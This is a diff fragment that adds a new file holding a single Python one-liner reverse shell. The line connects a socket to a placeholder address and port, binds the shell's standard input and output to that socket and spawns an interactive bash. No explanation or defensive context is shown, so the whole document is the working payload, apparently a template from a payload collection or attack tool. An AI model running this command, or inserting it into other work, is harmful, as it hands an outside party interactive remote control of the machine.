@@ -1,0 +1,2 @@
+python3 -c 'import os,pty,socket,time; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \[time.sleep(2) or s.connect(("__IPADDR__",__PORT__)) for _ in range(3) if not s]; \[os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn("/bin/bash")'
+
